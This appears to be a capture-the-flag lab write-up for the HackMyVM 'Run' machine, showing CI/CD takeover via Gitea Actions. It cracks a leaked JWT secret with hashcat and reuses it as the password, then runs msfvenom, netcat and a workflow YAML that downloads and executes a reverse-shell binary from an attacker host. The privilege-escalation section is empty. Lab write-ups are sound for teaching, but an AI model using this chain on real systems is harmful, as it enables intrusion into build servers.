# URL
https://hackmyvm.eu/machines/machine.php?vm=Run
# Concept
* CI/CD takeover
* Gitea Actions
* Github Actions
# Starting Scans
* there is only an HTTP service on port `3000` open
* if you explore the app, you'll discover a git repo at this endpoint
```
http://192.168.212.27:3000/dev/flask-jwt-auth
```
# Initial Access
* Gitea, like Github, is able to performs actions as part of a CI/CD function
* the problem is we need to be authenticated to the Gitea account to upload a malicious workflow file to run code
* luckily, there are secrets in the first commit to this repo: the JWT token
```
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwNzE0ODY1OCwianRpIjoiNjAwMWI5N2YtZjllOC00YTIxLThlYWMtYmE5NWEwY2Y4MDQ4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldiIsIm5iZiI6MTcwNzE0ODY1OCwiY3NyZiI6ImFkZjdmOTBiLWQ2NDctNDljZS1hNGRhLTQ3NDI1OWZkYzcyYyIsImV4cCI6MTcwNzE0OTI1OCwidXNlcm5hbWUiOiJkZXYifQ.tRZPFKRfJV7T-EHyQiBFqDEE1hl83MyCGtaBpSMwU_o"
```
* the first thing we can do with this JWT is pass it to a website like `jwt.io` and decode it
* if we do so with this JWT, we see that it indicates a username `dev`
* we can also attempt to crack the JWT secret key with `Hashcat`
```Bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```
* the secret key we crack is `developer88`, and any password or key we find could be used for password reuse
* it turns out the Gitea app credentials are `dev:developer88`
* with these crednetials, we can use the Gitea app to run arbitrary code and get direct acces to the server
* to prepare for the control of the CI/CD of Gitea app to get direct access to the server, we'll create a reverse shell binary and host it on our attacker server:
```
msfvenom -p linux/x64/shell_reverse_tcp lhost=<IP_ADDRESS> lport=<PORT_NUMBER> -f elf -o rev.elf
python -m http.server 80
```
* then create a listener for a potential reverse shell (for this example, we'll use port 443)
```
nc nlvp 443
```
## The steps to running Actions on the Gitea CI/CD
* Step 1: be authenticated to the Gitea account
* Step 2: go into the repo `Settings` tab at the top of the interface (Wrench Icon)
* Step 3: in the repo `Repository` tab, scroll down and make sure the `Actions [] Enable Repository Actions` checkbox is checked
* Step 4: create a `/.gitea/workflows` directory in the repo
* Step 5: create a `.yaml` file in the `/.gitea/workflows` directory that contains the Action script
  * for our example, we'll call the file `run-abitrary.yaml`
  * see the example script below:
```Yaml
# .gitea/workflows/run-arbitrary.yaml
name: Run arbitrary commands
on:
  push:
    branches: [ "*" ]

jobs:
  run:
    runs-on: run
    steps:
      - name: Run arbitrary commands
        run: |
          wget http://<ATTACKER_IP>/rev.elf
          chmod 777 rev.elf
          ./rev.elf          
```
  * this script downloads a reverse shell elf binary from an attacker-controlled server, makes the file executable, and then executes it
* Step 6: Clone the repository from a remote server: `git clone <repo_address>`
* Step 7: Enter the repo directory and modify one of the files
* Step 8: Set a commit for the repo `git commit -a -m "commit message"`
* Step 9: Push the commit `git push`
# Privilege Escalation
